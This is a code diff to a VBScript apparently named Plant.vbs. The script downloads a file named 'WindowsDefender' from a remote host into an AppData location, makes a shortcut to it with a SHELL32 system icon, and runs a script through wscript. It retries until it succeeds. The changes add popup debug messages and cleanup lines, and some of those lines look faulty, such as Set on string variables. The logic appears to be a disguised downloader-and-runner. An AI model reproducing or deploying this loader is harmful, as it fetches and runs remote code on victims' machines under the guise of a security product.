@@ -1,5 +1,6 @@
 appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
 Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")
+Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
 
 ' DownloadFile variables
 Dim downloadURL : downloadURL = "https://vibescope.onrender.com/WindowsDefender" ' Replace with your actual download URL
@@ -30,16 +31,19 @@ Sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        'WScript.Echo "Internet is connected (from Plant.vbs)!"
+        WshShell.Popup "Internet is connected! (from Plant.vbs)", 2, "CheckInternetConnection()", 64
+        Set objHTTP = Nothing
         DownloadFile
 		CreateShortcut
 		ChangeShortcutIcon
 		RunScript
     Else
-		'WScript.Echo "Internet is not connected (from Plant.vbs) !"
+        WshShell.Popup "Internet is not connected! (from Plant.vbs), retrying in 3 seconds..", 2, "CheckInternetConnection()", 64
 		WScript.Sleep 3000 ' 3000 milliseconds = 3 seconds
+        Set objHTTP = Nothing
 		CheckInternetConnection
     End If
+    Set objHTTP = Nothing
 End Sub
 
 Sub DownloadFile()
@@ -56,8 +60,14 @@ Sub DownloadFile()
 
     ' Handle errors during the request
     If Err.Number <> 0 Then
-        'WScript.Echo "Error during download request: " & Err.Description
+        WshShell.Popup "Error during download request, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
         WScript.Sleep 10000 ' 10 seconds
+        
+        ' Clean up
+        Set objXMLHTTP = Nothing
+        Set objADOStream = Nothing
+        Set objFSO = Nothing
+
         DownloadFile
         Exit Sub
     End If
@@ -76,11 +86,18 @@ Sub DownloadFile()
 
     ' Handle errors during the file save
     If Err.Number <> 0 Then
-        'WScript.Echo "Error saving the file: " & Err.Description
+        WshShell.Popup "Error saving the file, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
+        
         WScript.Sleep 10000 ' 10 seconds
+        
+        ' Clean up
+        Set objXMLHTTP = Nothing
+        Set objADOStream = Nothing
+        Set objFSO = Nothing
+
         DownloadFile
     Else
-        'WScript.Echo "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)"
+        WshShell.Popup "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)", 2, "DownloadFile()", 64
     End If
 
     On Error GoTo 0 ' Disable error handling
@@ -96,9 +113,9 @@ Sub CreateShortcut()
 		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(destinationDirectory & "\" & shortcutFileName) ' Create a shortcut object		
 		objShortcut.TargetPath = sourceFilePath 											     ' Set the target path for the shortcut
 		objShortcut.Save                        												 ' Save the shortcut
-		'WScript.Echo "Shortcut created successfully."
+        WshShell.Popup "Shortcut created successfully. (from Plant.vbs)", 2, "CreateShortcut()", 64
 	Else
-		'WScript.Echo "Source file does not exist."
+        WshShell.Popup "Source file does not exist. (from Plant.vbs)", 2, "CreateShortcut()", 64
 	End If
 	
 End Sub
@@ -108,9 +125,9 @@ Sub ChangeShortcutIcon()
 		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(shortcutPath)                       ' Create a shortcut object
 		objShortcut.IconLocation = "%SystemRoot%\System32\SHELL32.dll,34"             ' Set the icon location for the shortcut Icon 34  
 		objShortcut.Save                                                              ' Save the shortcut
-		'WScript.Echo "Shortcut icon changed successfully. (from Plant.vbs)"
+        WshShell.Popup "Shortcut icon changed successfully. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
 	Else
-		'WScript.Echo "Shortcut file does not exist. (from Plant.vbs)"
+        WshShell.Popup "Shortcut file does not exist. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
 	End If
 End Sub
 
@@ -118,6 +135,18 @@ Sub RunScript()
 	If objFSO.FileExists(scriptPath) Then
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
-        'WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)"
+        WshShell.Popup "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)", 2, "RunScript()", 64
     End If
 End Sub
+
+Set objFSO = Nothing
+Set downloadURL = Nothing
+Set downloadDirectory = Nothing
+Set downloadedFilename = Nothing
+Set url = Nothing
+Set sourceFilePath = Nothing
+Set destinationDirectory = Nothing
+Set shortcutFileName = Nothing
+Set shortcutPath = Nothing
+Set scriptPath = Nothing
+Set WshShell = Nothing
